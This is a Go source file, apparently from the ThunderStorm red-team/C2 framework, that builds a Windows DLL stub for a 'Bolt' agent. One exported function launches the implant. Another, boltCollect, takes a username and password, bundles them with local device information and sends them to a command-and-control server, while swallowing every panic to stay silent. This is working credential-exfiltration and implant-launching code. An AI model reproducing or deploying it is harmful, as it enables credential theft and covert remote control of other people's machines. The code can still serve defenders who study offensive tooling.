//go:build windows
// +build windows

//
// Copyright (C) 2021 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
// ThunderStorm Bolt Agent Launcher Stub with Oneshot

package main

import "C"
import (
	"runtime/debug"

	"github.com/iDigitalFlame/ThunderStorm/bolt"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
)

func main() {}

//export boltInit
func boltInit() {
	defer func() {
		recover()
	}()
	debug.SetPanicOnFault(true)
	bolt.Launch(boltGuardian, boltFiles, boltKey)
}

//export boltCollect
func boltCollect(us C.int, u *C.char, ps C.int, p *C.char) {
	defer func() {
		recover()
	}()
	debug.SetPanicOnFault(true)
	var (
		ub, pb = []byte(C.GoStringN(u, us)), []byte(C.GoStringN(p, ps))
		ur, pr = make([]rune, us/2), make([]rune, ps/2)
	)
	for i := 0; i < len(ub); i += 2 {
		ur[i/2] = rune(ub[i])
	}
	for i := 0; i < len(pb); i += 2 {
		pr[i/2] = rune(pb[i])
	}
	v, err := cfg.Raw(boltConfig)
	if err != nil {
		return
	}
	n := &com.Packet{ID: 77}
	n.WriteString(string(ur))
	n.WriteString(string(pr))
	device.Local.MarshalStream(n)
	c2.Default.Shoot(boltServer, nil, v, n)
}
